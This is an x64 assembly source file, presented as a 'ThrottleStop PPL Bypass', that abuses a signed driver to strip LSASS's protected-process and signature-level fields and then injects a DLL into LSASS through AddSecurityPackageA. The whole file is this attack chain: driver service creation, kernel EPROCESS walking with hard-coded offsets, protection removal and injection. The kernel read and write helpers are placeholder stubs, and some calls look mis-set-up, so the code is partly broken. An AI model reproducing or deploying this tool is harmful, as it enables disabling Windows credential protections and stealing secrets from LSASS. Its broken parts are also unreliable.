; ThrottleStop PPL Bypass - x64 Assembly version
; NASM/MASM compatible syntax
; By Emanuel Albuquerque - Вирус? - 26/04/2026

extern GetModuleHandleA
extern GetProcAddress
extern EnumDeviceDrivers
extern GetDeviceDriverBaseNameW
extern CreateFileA
extern DeviceIoControl
extern CloseHandle
extern OpenSCManagerW
extern CreateServiceW
extern StartServiceW
extern CloseServiceHandle
extern CreateToolhelp32Snapshot
extern Process32FirstW
extern Process32NextW
extern CloseHandle
extern AddSecurityPackageA
extern printf
extern wcscmp
extern GetLastError
extern Sleep
extern ExitProcess

section .data
    ; Strings
    drvname         dw  'n','t','o','s','k','r','n','l','.','e','x','e',0
    service_name    dw  'T','h','r','o','t','t','l','e','S','t','o','p',0
    driver_path     db  '\\\\.\\ThrottleStop',0
    sys_path        db  'C:\\Users\\Public\\a.sys',0
    ntssp_path      db  'c:\\windows\\system32\\ntssp.dll',0
    target_proc     dw  'l','s','a','s','s','.','e','x','e',0
    
    ; Format strings
    fmt_pid         db  '[+] Target process PID: %d',0xA,0
    fmt_nt_base     db  '[+] NT base: %p',0xA,0
    fmt_handle_ok   db  '[+] Handle on driver received!',0xA,0
    fmt_handle_fail db  '[-] Failed to get a handle on driver!',0xA,0
    fmt_eprocess    db  '[+] EPROCESS: 0x%llX',0xA,0
    fmt_found       db  '[+] Found LSASS EPROCESS!',0xA,0
    fmt_remove_ppl  db  '[+] Removing PPL Protection...',0xA,0
    fmt_remove_sig  db  '[+] Removing Signature Level Protection...',0xA,0
    fmt_disabled    db  '[+] LSASS protections disabled',0xA,0
    fmt_inject      db  '[+] DLL Injection successful!',0xA,0
    fmt_read        db  '[+] READ WHERE: 0x%016llx | CONTENT: 0x%016llx',0xA,0
    fmt_write       db  '[+] WRITE WHAT: 0x%016llx | WHERE: 0x%016llx',0xA,0
    fmt_service_ok  db  '[+] Service started correctly.',0xA,0
    fmt_service_err db  '[!] Error starting the service: %lu',0xA,0
    fmt_srv_create  db  '[!] Service created successfully.',0xA,0
    
    ; Constants
    IOCTL_MMMAPIOSPACE equ 0x8000645C
    INVALID_HANDLE_VALUE equ -1
    
    ; Offsets (adjust based on your Windows version)
    OFFSET_UNIQUE_PID   equ 0x2E0
    OFFSET_ACTIVE_LINKS equ 0x2E8
    OFFSET_PROTECTION   equ 0x6CA
    OFFSET_SIG_LEVEL    equ 0x6C8
    
section .bss
    hDrv            resq 1
    nt_base         resq 1
    lsass_pid       resd 1
    eprocess        resq 1
    search_eprocess resq 1
    search_pid      resq 1
    result          resq 1
    drivers         resq 1024
    sz_drivers      resw 1024
    cb_needed       resd 1
    bytes_returned  resd 1
    last_error      resd 1
    
section .text
global main

; Helper function: GetBaseAddr
GetBaseAddr:
    push rbp
    mov rbp, rsp
    sub rsp, 40h
    
    ; Parameters: RCX = drvname (wide string)
    mov [rbp-8], rcx  ; save drvname
    
    ; EnumDeviceDrivers(drivers, sizeof(drivers), &cb_needed)
    lea rdx, [drivers]
    mov r8, 1024*8
    lea r9, [cb_needed]
    mov rcx, rdx
    call EnumDeviceDrivers
    test rax, rax
    jz .fail
    
    mov eax, [cb_needed]
    cmp eax, 1024*8
    jae .fail
    
    mov ecx, [cb_needed]
    shr ecx, 3  ; divide by 8 to get count
    xor r10d, r10d  ; i = 0
    
.loop:
    cmp r10d, ecx
    jge .fail
    
    ; Get driver base name
    mov rax, [drivers + r10*8]
    lea rdx, [sz_drivers]
    mov r8d, 1024*2
    mov rcx, rax
    call GetDeviceDriverBaseNameW
    test rax, rax
    jz .next
    
    ; Compare with target driver name
    lea rcx, [sz_drivers]
    mov rdx, [rbp-8]
    call wcscmp
    test eax, eax
    jnz .next
    
    ; Found
    mov rax, [drivers + r10*8]
    jmp .done
    
.next:
    inc r10d
    jmp .loop
    
.fail:
    xor eax, eax
.done:
    leave
    ret

; Helper function: xRead
xRead:
    push rbp
    mov rbp, rsp
    sub rsp, 50h
    
    mov [rbp-8], rcx  ; hDrv
    mov [rbp-16], rdx ; virt_addr
    
    ; Call Superfetch memory_map::current() - simplified
    ; In real implementation, you'd need to include Superfetch
    ; For now, placeholder
    
    mov rax, -1
    leave
    ret

; Helper function: xWrite
xWrite:
    push rbp
    mov rbp, rsp
    sub rsp, 50h
    
    mov [rbp-8], rcx  ; hDrv
    mov [rbp-16], rdx ; where
    mov [rbp-24], r8  ; what
    
    mov rax, 0
    leave
    ret

; Helper function: FindProcessId
FindProcessId:
    push rbp
    mov rbp, rsp
    sub rsp, 40h
    
    mov [rbp-8], rcx  ; processName
    xor r12d, r12d    ; processId = 0
    
    ; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    mov ecx, 0x00000002  ; TH32CS_SNAPPROCESS
    xor edx, edx
    call CreateToolhelp32Snapshot
    cmp rax, INVALID_HANDLE_VALUE
    je .fail
    mov [rbp-16], rax   ; save snapshot
    
    ; Setup PROCESSENTRY32W
    sub rsp, 600h
    mov rcx, rsp
    mov dword [rcx], 600h  ; dwSize = sizeof(PROCESSENTRY32W)
    
    ; Process32FirstW
    mov rdx, rcx
    mov rcx, [rbp-16]
    call Process32FirstW
    test rax, rax
    jz .cleanup
    
.loop:
    ; Compare process name (szExeFile is at offset 0x24 for W version)
    mov rcx, rsp
    add rcx, 0x24
    mov rdx, [rbp-8]
    call wcscmp
    test eax, eax
    jnz .next
    
    ; Found - get PID (th32ProcessID at offset 0)
    mov r12d, [rsp]
    jmp .cleanup
    
.next:
    mov rcx, [rbp-16]
    mov rdx, rsp
    call Process32NextW
    test rax, rax
    jnz .loop
    
.cleanup:
    add rsp, 600h
    mov rcx, [rbp-16]
    call CloseHandle
    mov eax, r12d
    jmp .done
.fail:
    xor eax, eax
.done:
    leave
    ret

main:
    push rbp
    mov rbp, rsp
    sub rsp, 20h
    
    ; Find lsass.exe PID
    lea rcx, [target_proc]
    call FindProcessId
    mov [lsass_pid], eax
    mov edx, eax
    lea rcx, [fmt_pid]
    call printf
    
    ; Open Service Control Manager
    xor ecx, ecx
    xor edx, edx
    mov r8d, 0xF003F  ; SC_MANAGER_CREATE_SERVICE
    call OpenSCManagerW
    test rax, rax
    jz .service_error
    mov [rbp-8], rax  ; hSCManager
    
    ; Create Service
    push 0
    push 0
    push 0
    push 0
    push 0
    lea r9, [sys_path]
    mov r8d, 0x00000001  ; SERVICE_ERROR_NORMAL
    mov ecx, 0x00000002  ; SERVICE_AUTO_START
    mov edx, 0x00000001  ; SERVICE_KERNEL_DRIVER
    mov eax, 0x000F01FF  ; SERVICE_ALL_ACCESS
    push rax
    lea rcx, [service_name]
    lea rdx, [service_name]
    mov rax, [rbp-8]
    mov rcx, rax
    call CreateServiceW
    test rax, rax
    jnz .service_created
    call GetLastError
    ; Continue anyway - service might already exist
    
.service_created:
    lea rcx, [fmt_srv_create]
    call printf
    
    ; Start Service
    mov rcx, [rbp-8]
    xor edx, edx
    xor r8d, r8d
    call StartServiceW
    test rax, rax
    jnz .service_started
    
    call GetLastError
    mov r8d, eax
    lea rcx, [fmt_service_err]
    mov edx, eax
    jmp .service_start_done
    
.service_started:
    lea rcx, [fmt_service_ok]
    call printf
    
.service_start_done:
    ; Get ntoskrnl base
    lea rcx, [drvname]
    call GetBaseAddr
    mov [nt_base], rax
    mov rdx, rax
    lea rcx, [fmt_nt_base]
    call printf
    
    ; Open driver
    lea rcx, [driver_path]
    mov edx, 0x80000000 | 0x40000000  ; GENERIC_READ | GENERIC_WRITE
    xor r8d, r8d
    xor r9d, r9d
    mov dword [rsp+20h], 0x00000003   ; OPEN_EXISTING
    mov dword [rsp+28h], 0x00000080   ; FILE_ATTRIBUTE_NORMAL
    xor eax, eax
    mov [rsp+30h], rax
    call CreateFileA
    cmp rax, INVALID_HANDLE_VALUE
    je .driver_fail
    mov [hDrv], rax
    lea rcx, [fmt_handle_ok]
    call printf
    jmp .driver_ok
    
.driver_fail:
    lea rcx, [fmt_handle_fail]
    call printf
    jmp .cleanup
    
.driver_ok:
    ; Read PsInitialSystemProcess (offset adjust based on your NT build)
    mov rax, [nt_base]
    add rax, 0x5412e0  ; Offset to PsInitialSystemProcess
    mov rdx, rax
    mov rcx, [hDrv]
    call xRead
    mov [eprocess], rax
    mov rdx, rax
    lea rcx, [fmt_eprocess]
    call printf
    
    ; Find LSASS EPROCESS
    mov rax, [eprocess]
    mov [search_eprocess], rax
    
.find_lsass:
    mov rax, [search_eprocess]
    add rax, OFFSET_ACTIVE_LINKS
    mov rdx, rax
    mov rcx, [hDrv]
    call xRead
    sub rax, OFFSET_ACTIVE_LINKS
    mov [search_eprocess], rax
    
    mov rax, [search_eprocess]
    add rax, OFFSET_UNIQUE_PID
    mov rdx, rax
    mov rcx, [hDrv]
    call xRead
    mov [search_pid], rax
    
    cmp eax, [lsass_pid]
    jnz .find_lsass
    
    lea rcx, [fmt_found]
    call printf
    
    ; Remove PPL Protection
    lea rcx, [fmt_remove_ppl]
    call printf
    mov rdx, [search_eprocess]
    add rdx, OFFSET_PROTECTION
    xor r8d, r8d
    mov rcx, [hDrv]
    call xWrite
    
    ; Remove Signature Level
    lea rcx, [fmt_remove_sig]
    call printf
    mov rdx, [search_eprocess]
    add rdx, OFFSET_SIG_LEVEL
    xor r8d, r8d
    mov rcx, [hDrv]
    call xWrite
    
    lea rcx, [fmt_disabled]
    call printf
    
    ; Close driver handle
    mov rcx, [hDrv]
    call CloseHandle
    
    ; Inject DLL via AddSecurityPackage
    lea rcx, [ntssp_path]
    xor edx, edx
    call AddSecurityPackageA
    lea rcx, [fmt_inject]
    call printf
    
.cleanup:
    ; Close service handle
    mov rcx, [rbp-8]
    call CloseServiceHandle
    
    xor eax, eax
    call ExitProcess
    
.service_error:
    mov eax, 1
    call ExitProcess
